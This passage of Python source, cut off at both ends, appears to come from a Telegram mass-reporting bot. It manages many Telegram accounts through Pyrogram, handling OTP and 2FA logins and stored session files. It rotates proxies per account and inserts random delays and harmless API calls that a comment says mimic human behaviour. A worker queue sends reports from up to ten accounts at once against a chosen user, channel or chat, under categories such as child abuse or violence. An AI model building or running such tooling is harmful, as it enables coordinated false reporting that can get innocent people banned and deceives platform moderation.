                console.print(f"[red]❌ Failed to load users: {e}[/red]")

    def _save_users(self):
        try:
            data = {str(uid): user.to_dict() for uid, user in self.users.items()}
            with open(USERS_FILE, 'w') as f:
                json.dump(data, f, indent=2)
            console.print("[green]✅ Users saved[/green]")
        except Exception as e:
            console.print(f"[red]❌ Failed to save users: {e}[/red]")

    def log_activity(self, user_id: int, action: str, details: Dict[str, Any] = None):
        entry = {
            "timestamp": datetime.now().isoformat(),
            "user_id": user_id,
            "action": action,
            "details": details or {}
        }
        self.activity_log.append(entry)
        if len(self.activity_log) > 10000:
            self.activity_log = self.activity_log[-10000:]

    def log_security_event(self, event_type: str, user_id: int,
                          severity: str, description: str, details: Dict[str, Any] = None):
        entry = {
            "timestamp": datetime.now().isoformat(),
            "event_type": event_type,
            "user_id": user_id,
            "severity": severity,
            "description": description,
            "details": details or {}
        }
        self.security_log.append(entry)
        if len(self.security_log) > 5000:
            self.security_log = self.security_log[-5000:]

    def create_user_session(self, user_id: int, client_info: Dict[str, Any]) -> str:
        session_id = hashlib.sha256(f"{user_id}{time.time()}{random.random()}".encode()).hexdigest()[:32]
        self.sessions[session_id] = {
            "user_id": user_id,
            "created_at": datetime.now().isoformat(),
            "last_activity": datetime.now().isoformat(),
            "client_info": client_info
        }
        return session_id

    def validate_session(self, session_id: str, user_id: int) -> bool:
        if session_id in self.sessions:
            sess = self.sessions[session_id]
            if sess["user_id"] == user_id:
                sess["last_activity"] = datetime.now().isoformat()
                return True
        return False

    def update_user_activity(self, user_id: int, username: str = None,
                            first_name: str = None, last_name: str = None,
                            client_info: Dict[str, Any] = None):
        if user_id not in self.users:
            self.add_user(user_id, username, first_name, last_name)
        user = self.users[user_id]
        if username:
            user.username = username
        if first_name:
            user.first_name = first_name
        if last_name:
            user.last_name = last_name
        user.last_active = datetime.now()
        if client_info:
            user.metadata = user.metadata or {}
            user.metadata["last_client"] = client_info
        self._save_users()

    def check_permission(self, user_id: int, permission: str) -> bool:
        if user_id not in self.users:
            return False
        user = self.users[user_id]
        if user.role == UserRole.BANNED:
            return False
        allowed_roles = self.permissions.get(permission, [])
        return user.role in allowed_roles or permission in user.permissions

    def add_user(self, user_id: int, username: str = None, first_name: str = None,
                last_name: str = None, role: UserRole = UserRole.USER) -> Tuple[bool, str]:
        if user_id in self.users:
            return False, "User already exists"
        user = TelegramUser(
            user_id=user_id,
            username=username,
            first_name=first_name,
            last_name=last_name,
            role=role
        )
        self.users[user_id] = user
        self._save_users()
        self.log_activity(user_id, "user_added", {"role": role.name})
        return True, "User added successfully"

    def promote_user(self, user_id: int, new_role: UserRole,
                    promoted_by: int) -> Tuple[bool, str]:
        if user_id not in self.users:
            return False, "User not found"
        user = self.users[user_id]
        if user.role >= new_role:
            return False, "User already has this or higher role"
        user.role = new_role
        self._save_users()
        self.log_activity(promoted_by, "user_promoted", {"target": user_id, "new_role": new_role.name})
        return True, f"User promoted to {new_role.name}"

    def demote_user(self, user_id: int, new_role: UserRole,
                   demoted_by: int) -> Tuple[bool, str]:
        if user_id not in self.users:
            return False, "User not found"
        user = self.users[user_id]
        if user.role <= new_role:
            return False, "User already has this or lower role"
        user.role = new_role
        self._save_users()
        self.log_activity(demoted_by, "user_demoted", {"target": user_id, "new_role": new_role.name})
        return True, f"User demoted to {new_role.name}"

    def ban_user(self, user_id: int, banned_by: int, reason: str) -> Tuple[bool, str]:
        if user_id not in self.users:
            return False, "User not found"
        user = self.users[user_id]
        user.role = UserRole.BANNED
        user.flags.add(f"banned_by_{banned_by}")
        self._save_users()
        self.log_security_event("user_banned", user_id, "HIGH", reason, {"banned_by": banned_by})
        return True, "User banned"

    def unban_user(self, user_id: int, unbanned_by: int) -> Tuple[bool, str]:
        if user_id not in self.users:
            return False, "User not found"
        user = self.users[user_id]
        user.role = UserRole.USER
        user.flags.discard(f"banned_by_{unbanned_by}")
        self._save_users()
        self.log_security_event("user_unbanned", user_id, "MEDIUM", "User unbanned", {"unbanned_by": unbanned_by})
        return True, "User unbanned"

    def increment_reports(self, user_id: int, success: bool = True):
        if user_id in self.users:
            user = self.users[user_id]
            user.reports_made += 1
            user.update_statistics(success, 0)
            self._save_users()

    def get_user_stats(self, user_id: int) -> Optional[Dict[str, Any]]:
        if user_id in self.users:
            user = self.users[user_id]
            return user.to_dict()
        return None

    def get_system_stats(self) -> Dict[str, Any]:
        total = len(self.users)
        active = sum(1 for u in self.users.values() if u.last_active and (datetime.now() - u.last_active).days < 7)
        banned = sum(1 for u in self.users.values() if u.role == UserRole.BANNED)
        admins = sum(1 for u in self.users.values() if u.role >= UserRole.ADMIN)
        return {
            "total_users": total,
            "active_users": active,
            "banned_users": banned,
            "admin_count": admins,
            "total_reports": sum(u.reports_made for u in self.users.values()),
            "success_rate": statistics.mean([u.statistics.get("report_success_rate", 0) for u in self.users.values()]) if self.users else 0
        }

    def export_user_data(self, user_id: int) -> Optional[Dict[str, Any]]:
        if user_id in self.users:
            return self.users[user_id].to_dict()
        return None

    def cleanup_inactive_sessions(self, max_age_hours: int = 24):
        cutoff = datetime.now() - timedelta(hours=max_age_hours)
        to_delete = []
        for sid, sess in self.sessions.items():
            created = datetime.fromisoformat(sess["created_at"])
            if created < cutoff:
                to_delete.append(sid)
        for sid in to_delete:
            del self.sessions[sid]

    def run_security_scan(self):
        # Placeholder for security audit
        pass

    def get_dashboard_data(self) -> Dict[str, Any]:
        return self.get_system_stats()

# ============================================
# ADVANCED ACCOUNT MANAGER – FULLY FIXED
# ============================================
class AdvancedAccountManager:
    def __init__(self, proxy_manager: AdvancedProxyManager,
                 user_manager: AdvancedUserManager,
                 otp_verification: AdvancedOTPVerification):
        self.accounts: Dict[str, TelegramAccount] = {}
        self.account_sessions: Dict[str, Dict] = {}
        self.proxy_manager = proxy_manager
        self.user_manager = user_manager
        self.otp_verification = otp_verification
        self.max_reports_per_account = 9
        self.maintenance_tasks: Dict[str, asyncio.Task] = {}
        self.health_monitor_task = None
        self._load_accounts()
        self._start_health_monitor()

    # ------------------------------------------------------------------
    #  PERSISTENCE
    # ------------------------------------------------------------------
    def _load_accounts(self):
        if ACCOUNTS_FILE.exists():
            try:
                with open(ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                for phone, acc_data in data.items():
                    try:
                        account = TelegramAccount.from_dict(acc_data)
                        self.accounts[phone] = account
                    except Exception as e:
                        console.print(f"[red]❌ Failed to load account {phone}: {e}[/red]")
                console.print(f"[green]✅ Loaded {len(self.accounts)} accounts[/green]")
            except Exception as e:
                console.print(f"[red]❌ Error loading accounts: {e}[/red]")
                self.accounts = {}
        else:
            console.print("[yellow]⚠️ No accounts file found, starting fresh[/yellow]")
            self.accounts = {}

    def _save_accounts(self):
        try:
            data = {}
            for phone, account in self.accounts.items():
                try:
                    data[phone] = account.to_dict()
                except Exception as e:
                    console.print(f"[red]❌ Failed to serialize account {phone}: {e}[/red]")
            with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            console.print("[green]✅ Accounts saved successfully[/green]")
        except Exception as e:
            console.print(f"[red]❌ Error saving accounts: {e}[/red]")

    # ------------------------------------------------------------------
    #  ACCOUNT OPERATIONS
    # ------------------------------------------------------------------
    def _validate_account(self, account: TelegramAccount) -> Tuple[bool, str]:
        if not account.phone or len(account.phone) < 5:
            return False, "Invalid phone number"
        if not account.session_file:
            return False, "Missing session file path"
        if account.phone in self.accounts:
            return False, "Account already exists"
        return True, "Valid"

    async def _update_account_info(self, account: TelegramAccount):
        if not account.client or not account.client.is_connected:
            return
        try:
            me = await account.client.get_me()
            account.user_id = me.id
            account.username = me.username
            account.first_name = me.first_name
            account.last_name = me.last_name
            account.is_premium = getattr(me, 'is_premium', False)
            account.is_verified = getattr(me, 'is_verified', False)
            account.is_scam = getattr(me, 'is_scam', False)
            account.is_fake = getattr(me, 'is_fake', False)
            account.is_deleted = getattr(me, 'is_deleted', False)
            try:
                hint = await account.client.get_password_hint()
                account.two_factor_enabled = bool(hint)
                account.password_hint = hint
            except:
                account.two_factor_enabled = False
        except Exception as e:
            console.print(f"[yellow]⚠️ Could not update account info: {e}[/yellow]")

    @staticmethod
    def _get_country_from_phone(phone: str) -> str:
        phone = phone.strip()
        if phone.startswith('+'):
            phone = phone[1:]
        country_codes = {
            '1': 'US', '7': 'RU', '20': 'EG', '27': 'ZA', '30': 'GR', '31': 'NL',
            '32': 'BE', '33': 'FR', '34': 'ES', '36': 'HU', '39': 'IT', '40': 'RO',
            '41': 'CH', '43': 'AT', '44': 'GB', '45': 'DK', '46': 'SE', '47': 'NO',
            '48': 'PL', '49': 'DE', '51': 'PE', '52': 'MX', '53': 'CU', '54': 'AR',
            '55': 'BR', '56': 'CL', '57': 'CO', '58': 'VE', '60': 'MY', '61': 'AU',
            '62': 'ID', '63': 'PH', '64': 'NZ', '65': 'SG', '66': 'TH', '81': 'JP',
            '82': 'KR', '84': 'VN', '86': 'CN', '90': 'TR', '91': 'IN', '92': 'PK',
            '93': 'AF', '94': 'LK', '95': 'MM', '98': 'IR', '212': 'MA', '213': 'DZ',
            '216': 'TN', '218': 'LY', '220': 'GM', '221': 'SN', '222': 'MR', '223': 'ML',
            '224': 'GN', '225': 'CI', '226': 'BF', '227': 'NE', '228': 'TG', '229': 'BJ',
            '230': 'MU', '231': 'LR', '232': 'SL', '233': 'GH', '234': 'NG', '235': 'TD',
            '236': 'CF', '237': 'CM', '238': 'CV', '239': 'ST', '240': 'GQ', '241': 'GA',
            '242': 'CG', '243': 'CD', '244': 'AO', '245': 'GW', '246': 'IO', '247': 'AC',
            '248': 'SC', '249': 'SD', '250': 'RW', '251': 'ET', '252': 'SO', '253': 'DJ',
            '254': 'KE', '255': 'TZ', '256': 'UG', '257': 'BI', '258': 'MZ', '260': 'ZM',
            '261': 'MG', '262': 'RE', '263': 'ZW', '264': 'NA', '265': 'MW', '266': 'LS',
            '267': 'BW', '268': 'SZ', '269': 'KM', '290': 'SH', '291': 'ER', '297': 'AW',
            '298': 'FO', '299': 'GL', '350': 'GI', '351': 'PT', '352': 'LU', '353': 'IE',
            '354': 'IS', '355': 'AL', '356': 'MT', '357': 'CY', '358': 'FI', '359': 'BG',
            '370': 'LT', '371': 'LV', '372': 'EE', '373': 'MD', '374': 'AM', '375': 'BY',
            '376': 'AD', '377': 'MC', '378': 'SM', '379': 'VA', '380': 'UA', '381': 'RS',
            '382': 'ME', '383': 'XK', '385': 'HR', '386': 'SI', '387': 'BA', '389': 'MK',
            '420': 'CZ', '421': 'SK', '423': 'LI', '500': 'FK', '501': 'BZ', '502': 'GT',
            '503': 'SV', '504': 'HN', '505': 'NI', '506': 'CR', '507': 'PA', '508': 'PM',
            '509': 'HT', '590': 'GP', '591': 'BO', '592': 'GY', '593': 'EC', '594': 'GF',
            '595': 'PY', '596': 'MQ', '597': 'SR', '598': 'UY', '599': 'CW', '670': 'TL',
            '672': 'NF', '673': 'BN', '674': 'NR', '675': 'PG', '676': 'TO', '677': 'SB',
            '678': 'VU', '679': 'FJ', '680': 'PW', '681': 'WF', '682': 'CK', '683': 'NU',
            '684': 'AS', '685': 'WS', '686': 'KI', '687': 'NC', '688': 'TV', '689': 'PF',
            '690': 'TK', '691': 'FM', '692': 'MH', '850': 'KP', '852': 'HK', '853': 'MO',
            '855': 'KH', '856': 'LA', '880': 'BD', '886': 'TW', '960': 'MV', '961': 'LB',
            '962': 'JO', '963': 'SY', '964': 'IQ', '965': 'KW', '966': 'SA', '967': 'YE',
            '968': 'OM', '970': 'PS', '971': 'AE', '972': 'IL', '973': 'BH', '974': 'QA',
            '975': 'BT', '976': 'MN', '977': 'NP', '992': 'TJ', '993': 'TM', '994': 'AZ',
            '995': 'GE', '996': 'KG', '998': 'UZ'
        }
        for code, country in country_codes.items():
            if phone.startswith(code):
                return country
        return "Unknown"

    async def add_account(self, phone: str, proxy: Optional[str] = None) -> Tuple[bool, str, Optional[TelegramAccount]]:
        if phone in self.accounts:
            return False, "Account already exists", None

        safe_phone = re.sub(r'[^0-9]', '', phone)
        session_path = SESSION_DIR / f"{safe_phone}.session"
        session_path.parent.mkdir(exist_ok=True)

        account = TelegramAccount(
            phone=phone,
            session_file=session_path,
            proxy=proxy,
            status=AccountStatus.VERIFYING,
            country=self._get_country_from_phone(phone)
        )

        is_valid, msg = self._validate_account(account)
        if not is_valid:
            return False, msg, None

        proxy_dict = None
        if proxy:
            try:
                proxy_entry = self.proxy_manager.proxy_map.get(proxy)
                if proxy_entry and proxy_entry.is_active:
                    account.proxy_entry = proxy_entry
                    proxy_dict = self._format_proxy_for_pyrogram(proxy)
                else:
                    best_proxy = await self.proxy_manager.get_best_proxy_for_account()
                    if best_proxy:
                        account.proxy_entry = best_proxy
                        proxy_dict = self._format_proxy_for_pyrogram(best_proxy.proxy)
                    else:
                        console.print("[yellow]⚠️ No working proxy found, using direct connection[/yellow]")
            except Exception as e:
                console.print(f"[yellow]⚠️ Proxy error: {e}, using direct connection[/yellow]")

        account.client = pyrogram.Client(
            name=str(session_path),
            api_id=API_ID,
            api_hash=API_HASH,
            proxy=proxy_dict,
            workdir=str(SESSION_DIR),
            app_version=account.app_version,
            device_model=account.device_model,
            system_version=account.system_version,
            lang_code=account.lang_code,
            sleep_threshold=30,
            no_updates=True
        )

        try:
            await account.client.connect()
            if await account.client.is_user_authorized():
                await self._update_account_info(account)
                account.status = AccountStatus.ACTIVE
                self.accounts[phone] = account
                self._save_accounts()
                await account.client.disconnect()
                return True, "Account already authorized", account
            else:
                self.accounts[phone] = account
                self._save_accounts()
                return True, "OTP required", account
        except Exception as e:
            console.print(f"[red]❌ Failed to initialize account {phone}: {e}[/red]")
            return False, f"Connection error: {str(e)[:100]}", None

    def _format_proxy_for_pyrogram(self, proxy_str: str) -> Dict[str, Any]:
        try:
            parsed = urllib.parse.urlparse(proxy_str)
            scheme = parsed.scheme.lower()
            host = parsed.hostname
            port = parsed.port
            username = parsed.username
            password = parsed.password

            proxy_type = {
                'socks5': 'socks5',
                'socks4': 'socks4',
                'http': 'http',
                'https': 'http'
            }.get(scheme, 'http')

            result = {
                'scheme': proxy_type,
                'hostname': host,
                'port': port
            }
            if username:
                result['username'] = username
            if password:
                result['password'] = password
            return result
        except Exception as e:
            console.print(f"[red]❌ Error formatting proxy: {e}[/red]")
            return None

    async def verify_otp_code(self, phone: str, otp_code: str) -> Tuple[bool, str]:
        if phone not in self.accounts:
            return False, "Account not found"
        account = self.accounts[phone]
        if account.status != AccountStatus.VERIFYING:
            return False, f"Account not in VERIFYING state (current: {account.status.name})"

        try:
            if not account.client or not account.client.is_connected:
                await account.client.connect()

            otp_session = self.otp_verification.otp_sessions.get(phone)
            if not otp_session:
                return False, "No active OTP session"

            signed_in = await account.client.sign_in(
                phone_number=account.phone,
                phone_code_hash=otp_session.phone_code_hash,
                phone_code=otp_code
            )

            if signed_in:
                await self._update_account_info(account)
                account.status = AccountStatus.ACTIVE
                account.last_login = datetime.now()
                self._save_accounts()
                return True, "Verification successful"
            else:
                return False, "Sign in returned unexpected result"

        except SessionPasswordNeeded:
            account.status = AccountStatus.NEED_PASSWORD
            self._save_accounts()
            return False, "2FA password required"
        except PhoneCodeInvalid:
            return False, "Invalid OTP code"
        except PhoneCodeExpired:
            return False, "OTP code expired"
        except FloodWait as e:
            account.flood_wait_seconds = e.value
            account.session_flood_waits += 1
            account.last_flood_wait = datetime.now()
            self._save_accounts()
            return False, f"Flood wait: {e.value} seconds"
        except Exception as e:
            return False, f"Verification error: {str(e)[:100]}"

    async def verify_2fa_password(self, phone: str, password: str) -> Tuple[bool, str]:
        if phone not in self.accounts:
            return False, "Account not found"
        account = self.accounts[phone]
        if account.status != AccountStatus.NEED_PASSWORD:
            return False, "Account not awaiting 2FA"

        try:
            if not account.client or not account.client.is_connected:
                await account.client.connect()

            await account.client.check_password(password)
            await self._update_account_info(account)
            account.status = AccountStatus.ACTIVE
            account.last_login = datetime.now()
            account.two_factor_enabled = True
            self._save_accounts()
            return True, "2FA verification successful"

        except PasswordHashInvalid:
            return False, "Invalid password"
        except FloodWait as e:
            account.flood_wait_seconds = e.value
            account.session_flood_waits += 1
            account.last_flood_wait = datetime.now()
            self._save_accounts()
            return False, f"Flood wait: {e.value} seconds"
        except Exception as e:
            return False, f"2FA error: {str(e)[:100]}"

    async def get_available_accounts(self, limit: int = None) -> List[TelegramAccount]:
        available = [
            acc for acc in self.accounts.values()
            if acc.status == AccountStatus.ACTIVE and acc.session_file.exists()
        ]
        available.sort(key=lambda x: x.get_health_score(), reverse=True)
        if limit:
            return available[:limit]
        return available

    async def rotate_proxy_for_account(self, account: TelegramAccount) -> bool:
        if not account.client:
            return False

        try:
            best_proxy = await self.proxy_manager.get_best_proxy_for_account()
            if not best_proxy:
                console.print("[yellow]⚠️ No suitable proxy found for rotation[/yellow]")
                return False

            if account.client.is_connected:
                await account.client.disconnect()

            account.proxy = best_proxy.proxy
            account.proxy_entry = best_proxy
            account.proxy_rotation_count += 1
            account.last_proxy_rotation = datetime.now()

            proxy_dict = self._format_proxy_for_pyrogram(best_proxy.proxy)
            account.client.proxy = proxy_dict

            await account.client.connect()
            if await account.client.is_user_authorized():
                account.proxy_verified = True
                account.proxy_failures = 0
                self._save_accounts()
                return True
            else:
                account.proxy_verified = False
                return False

        except Exception as e:
            console.print(f"[red]❌ Proxy rotation failed: {e}[/red]")
            account.proxy_failures += 1
            return False

    async def check_account_connection(self, account: TelegramAccount) -> bool:
        try:
            if not account.client:
                return False

            if not account.client.is_connected:
                await account.client.connect()

            if await account.client.is_user_authorized():
                account.last_online_check = datetime.now()
                account.is_online = True
                return True
            else:
                account.is_online = False
                account.status = AccountStatus.SESSION_EXPIRED
                return False
        except Exception as e:
            account.is_online = False
            account.session_errors += 1
            return False

    async def _check_account_health(self):
        console.print("[cyan]🔄 Running account health check...[/cyan]")
        for phone, account in self.accounts.items():
            if account.status == AccountStatus.ACTIVE:
                try:
                    await self.check_account_connection(account)
                    if account.last_login:
                        account.session_age_days = (datetime.now() - account.last_login).days
                    account.session_quality = account.get_health_score()
                except Exception as e:
                    console.print(f"[red]❌ Health check failed for {phone}: {e}[/red]")
        self._save_accounts()

    def _start_health_monitor(self):
        async def monitor():
            while True:
                try:
                    await self._check_account_health()
                    await asyncio.sleep(300)
                except Exception as e:
                    console.print(f"[red]❌ Health monitor error: {e}[/red]")
                    await asyncio.sleep(60)
        self.health_monitor_task = asyncio.create_task(monitor())
        console.print("[green]✅ Account health monitor started[/green]")

    async def perform_account_maintenance(self):
        for account in self.accounts.values():
            if account.status == AccountStatus.ACTIVE:
                if account.session_age_days > 90:
                    console.print(f"[yellow]⚠️ Account {account.phone} is old ({account.session_age_days} days)[/yellow]")
                if account.session_quality < 30:
                    console.print(f"[red]❌ Account {account.phone} health critical, rotating proxy[/red]")
                    await self.rotate_proxy_for_account(account)
        self._save_accounts()

    def get_account_stats(self) -> Dict[str, Any]:
        stats = {
            "total": len(self.accounts),
            "active": 0,
            "verifying": 0,
            "banned": 0,
            "flood_wait": 0,
            "need_password": 0,
            "session_expired": 0,
            "proxy_failed": 0,
            "premium": 0,
            "total_reports": 0,
            "avg_success_rate": 0.0,
            "accounts_by_country": defaultdict(int),
            "accounts_by_status": defaultdict(int)
        }
        success_rates = []
        for acc in self.accounts.values():
            stats["accounts_by_status"][acc.status.name] += 1
            if acc.status == AccountStatus.ACTIVE:
                stats["active"] += 1
                success_rates.append(acc.success_rate)
            elif acc.status == AccountStatus.VERIFYING:
                stats["verifying"] += 1
            elif acc.status == AccountStatus.BANNED:
                stats["banned"] += 1
            elif acc.status == AccountStatus.FLOOD_WAIT:
                stats["flood_wait"] += 1
            elif acc.status == AccountStatus.NEED_PASSWORD:
                stats["need_password"] += 1
            elif acc.status == AccountStatus.SESSION_EXPIRED:
                stats["session_expired"] += 1
            elif acc.status == AccountStatus.PROXY_FAILED:
                stats["proxy_failed"] += 1

            if acc.is_premium:
                stats["premium"] += 1
            stats["total_reports"] += acc.total_reports
            if acc.country:
                stats["accounts_by_country"][acc.country] += 1

        if success_rates:
            stats["avg_success_rate"] = sum(success_rates) / len(success_rates)
        return stats

    def get_system_stats(self) -> Dict[str, Any]:
        return self.get_account_stats()

    def export_account_data(self) -> Dict[str, Any]:
        return {phone: acc.to_dict() for phone, acc in self.accounts.items()}

    async def cleanup(self):
        console.print("[yellow]🧹 Cleaning up account manager...[/yellow]")
        if self.health_monitor_task:
            self.health_monitor_task.cancel()
            try:
                await self.health_monitor_task
            except asyncio.CancelledError:
                pass
        for phone, account in self.accounts.items():
            if account.client and account.client.is_connected:
                try:
                    await account.client.disconnect()
                except:
                    pass
        self._save_accounts()
        console.print("[green]✅ Account manager cleanup complete[/green]")

# ============================================
# ADVANCED REPORTING ENGINE – Pyrogram
# ============================================
class AdvancedReportingEngine:
    def __init__(self, account_manager: AdvancedAccountManager,
                 proxy_manager: AdvancedProxyManager,
                 user_manager: AdvancedUserManager):
        self.account_manager = account_manager
        self.proxy_manager = proxy_manager
        self.user_manager = user_manager
        self.active_jobs: Dict[str, ReportJob] = {}
        self.job_history: List[ReportJob] = []
        self.report_queue: asyncio.Queue = asyncio.Queue()
        self.worker_tasks: List[asyncio.Task] = []
        self.is_running = False

        self.categories = {
            "ILLEGAL_DRUGS": {
                "name": "Illegal Drugs",
                "priority": "HIGH",
                "pyrogram_reason": raw_types.InputReportReasonIllegalDrugs,
                "subcategories": {
                    1: {"name": "Drug Sales", "description": "Selling illegal drugs"},
                    2: {"name": "Drug Promotion", "description": "Promoting drug use"},
                    3: {"name": "Drug Recipes", "description": "Sharing drug production methods"},
                    4: {"name": "Drug Trafficking", "description": "Organized drug distribution"}
                }
            },
            "SPAM": {
                "name": "Spam",
                "priority": "MEDIUM",
                "pyrogram_reason": raw_types.InputReportReasonSpam,
                "subcategories": {
                    1: {"name": "Mass Spamming", "description": "Sending bulk unwanted messages"},
                    2: {"name": "Phishing Links", "description": "Sharing phishing websites"},
                    3: {"name": "Financial Scams", "description": "Financial fraud attempts"},
                    4: {"name": "Fake Giveaways", "description": "Fake contests and giveaways"},
                    5: {"name": "Bot Spam", "description": "Automated spam messages"}
                }
            },
            "VIOLENCE": {
                "name": "Violence",
                "priority": "HIGH",
                "pyrogram_reason": raw_types.InputReportReasonViolence,
                "subcategories": {
                    1: {"name": "Threats", "description": "Direct threats of violence"},
                    2: {"name": "Harassment", "description": "Severe harassment"},
                    3: {"name": "Glorification", "description": "Glorifying violent acts"},
                    4: {"name": "Extremism", "description": "Extremist content"}
                }
            },
            "CHILD_ABUSE": {
                "name": "Child Abuse",
                "priority": "CRITICAL",
                "pyrogram_reason": raw_types.InputReportReasonChildAbuse,
                "subcategories": {
                    1: {"name": "Explicit Content", "description": "Child sexual abuse material"},
                    2: {"name": "Grooming", "description": "Inappropriate contact with minors"},
                    3: {"name": "Exploitation", "description": "Child exploitation"}
                }
            },
            "PORNOGRAPHY": {
                "name": "Pornography",
                "priority": "MEDIUM",
                "pyrogram_reason": raw_types.InputReportReasonPornography,
                "subcategories": {
                    1: {"name": "Explicit Media", "description": "Pornographic images/videos"},
                    2: {"name": "Adult Content", "description": "Unsuitable adult content"},
                    3: {"name": "Child Safety", "description": "Content accessible to minors"}
                }
            },
            "OTHER": {
                "name": "Other",
                "priority": "LOW",
                "pyrogram_reason": raw_types.InputReportReasonOther,
                "subcategories": {
                    1: {"name": "Copyright", "description": "Copyright infringement"},
                    2: {"name": "Impersonation", "description": "Fake identity"},
                    3: {"name": "Illegal Goods", "description": "Sale of illegal items"},
                    4: {"name": "Hate Speech", "description": "Hate speech or discrimination"}
                }
            }
        }

        self.priority_weights = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1}
        self._load_jobs()
        self._start_workers()

    def _load_jobs(self):
        if JOBS_FILE.exists():
            try:
                with open(JOBS_FILE, 'r') as f:
                    data = json.load(f)
                for job_id, job_data in data.get('active', {}).items():
                    job = ReportJob.from_dict(job_data)
                    self.active_jobs[job_id] = job
                for job_data in data.get('history', []):
                    job = ReportJob.from_dict(job_data)
                    self.job_history.append(job)
                console.print(f"[green]✅ Loaded {len(self.active_jobs)} active jobs, {len(self.job_history)} historical jobs[/green]")
            except Exception as e:
                console.print(f"[red]❌ Failed to load jobs: {e}[/red]")

    def _save_jobs(self):
        try:
            data = {
                'active': {jid: job.to_dict() for jid, job in self.active_jobs.items()},
                'history': [job.to_dict() for job in self.job_history[-1000:]]
            }
            with open(JOBS_FILE, 'w') as f:
                json.dump(data, f, indent=2)
            console.print("[green]✅ Jobs saved[/green]")
        except Exception as e:
            console.print(f"[red]❌ Failed to save jobs: {e}[/red]")

    def _start_workers(self):
        self.is_running = True
        for i in range(5):  # 5 concurrent workers
            task = asyncio.create_task(self._worker_loop())
            self.worker_tasks.append(task)
        console.print("[green]✅ Reporting workers started[/green]")

    async def _worker_loop(self):
        while self.is_running:
            try:
                job_id = await self.report_queue.get()
                if job_id is None:
                    break
                if job_id in self.active_jobs:
                    await self._process_job(self.active_jobs[job_id])
                self.report_queue.task_done()
            except asyncio.CancelledError:
                break
            except Exception as e:
                console.print(f"[red]❌ Worker error: {e}[/red]")

    async def create_job(self, target: str, target_type: str, category: str,
                        subcategory: str, description: str, created_by: int) -> str:
        job_id = str(uuid.uuid4())[:8]
        job = ReportJob(
            job_id=job_id,
            target=target,
            target_type=target_type,
            category=category,
            subcategory=subcategory,
            description=description,
            created_by=created_by,
            priority=self.priority_weights.get(self.categories.get(category, {}).get('priority', 'MEDIUM'), 2)
        )
        self.active_jobs[job_id] = job
        self._save_jobs()
        return job_id

    async def start_job(self, job_id: str) -> bool:
        if job_id not in self.active_jobs:
            return False
        job = self.active_jobs[job_id]
        if job.status != ReportStatus.PENDING:
            return False
        job.status = ReportStatus.VALIDATING
        job.started_at = datetime.now()
        self._save_jobs()
        await self.report_queue.put(job_id)
        return True

    async def _process_job(self, job: ReportJob):
        console.print(f"[cyan]🔄 Processing job {job.job_id} for target {job.target}[/cyan]")
        job.status = ReportStatus.PROCESSING

        # 1. Validate target
        is_valid, target_id, access_hash = await self._validate_target(job)
        if not is_valid:
            job.status = ReportStatus.FAILED
            job.metadata['validation_passed'] = False
            job.error_log.append({"timestamp": datetime.now().isoformat(), "error": "Target validation failed"})
            await self._complete_job(job)
            return
        job.metadata['target_resolved'] = True
        job.metadata['target_id'] = target_id
        job.metadata['target_access_hash'] = access_hash
        job.metadata['validation_passed'] = True

        # 2. Get available accounts
        accounts = await self.account_manager.get_available_accounts(limit=20)
        if not accounts:
            job.status = ReportStatus.FAILED
            job.error_log.append({"timestamp": datetime.now().isoformat(), "error": "No available accounts"})
            await self._complete_job(job)
            return

        # 3. Execute reports
        report_tasks = []
        for account in accounts[:10]:  # limit to 10 per job for safety
            task = asyncio.create_task(
                self._process_account_report(account, job, target_id, access_hash)
            )
            report_tasks.append(task)

        results = await asyncio.gather(*report_tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, Exception):
                job.add_result({"status": "FAILED", "error": str(result)})
            else:
                job.add_result(result)

        # 4. Finalize
        job.status = ReportStatus.COMPLETED
        job.completed_at = datetime.now()
        job.update_duration()
        await self._complete_job(job)

    async def _validate_target(self, job: ReportJob) -> Tuple[bool, Optional[int], Optional[int]]:
        # Try to resolve using first available account
        accounts = await self.account_manager.get_available_accounts(limit=1)
        if not accounts:
            return False, None, None
        account = accounts[0]
        try:
            if not account.client or not account.client.is_connected:
                await account.client.connect()
            if job.target_type == "user":
                entity = await account.client.get_users(job.target)
                return True, entity.id, entity.access_hash
            elif job.target_type == "channel":
                entity = await account.client.get_chat(job.target)
                return True, entity.id, getattr(entity, 'access_hash', None)
            elif job.target_type == "chat":
                entity = await account.client.get_chat(job.target)
                return True, entity.id, None
        except Exception as e:
            console.print(f"[red]❌ Target validation error: {e}[/red]")
        return False, None, None

    async def _process_account_report(self, account: TelegramAccount, job: ReportJob,
                                     target_id: int, access_hash: Optional[int]) -> Dict[str, Any]:
        result = {
            "account": account.phone,
            "timestamp": datetime.now().isoformat(),
            "status": "FAILED",
            "error": None,
            "response_time": 0,
            "flags": []
        }
        start_time = time.time()
        try:
            # Rotate proxy if needed
            if account.should_rotate_proxy():
                rotated = await self.account_manager.rotate_proxy_for_account(account)
                if rotated:
                    result["flags"].append("proxy_rotated")

            # Ensure client is connected
            if not account.client or not account.client.is_connected:
                await account.client.connect()
                if not await account.client.is_user_authorized():
                    result["error"] = "Account not authorized"
                    return result

            # Simulate human behavior
            await self._simulate_desktop_behavior(account.client)

            # Execute report
            await self._execute_report(account.client, target_id, access_hash, job)

            # Update success
            account.report_count += 1
            account.total_reports += 1
            account.last_report_time = datetime.now()
            account.update_statistics("report", True, latency=(time.time() - start_time)*1000)

            result["status"] = "COMPLETED"
            result["response_time"] = (time.time() - start_time) * 1000
            result["flags"].append("success")

        except FloodWait as e:
            result["error"] = f"Flood wait: {e.value}"
            result["flags"].append("flood_wait")
            account.session_flood_waits += 1
            account.last_flood_wait = datetime.now()
        except Exception as e:
            result["error"] = str(e)[:200]
        finally:
            account.report_count = 0 if account.report_count > 9 else account.report_count
            self.account_manager._save_accounts()
        return result

    async def _simulate_desktop_behavior(self, client: pyrogram.Client):
        # Random delay to mimic human typing/thinking
        await asyncio.sleep(random.uniform(0.5, 2.0))
        # Could also perform a harmless API call like get_me
        try:
            await client.get_me()
        except:
            pass

    async def _execute_report(self, client: pyrogram.Client, target_id: int,
                             access_hash: Optional[int], job: ReportJob):
        reason = self.categories.get(job.category, {}).get('pyrogram_reason', raw_types.InputReportReasonOther)
        peer = None
        if access_hash:
            peer = raw_types.InputPeerChannel(channel_id=target_id, access_hash=access_hash)
        else:
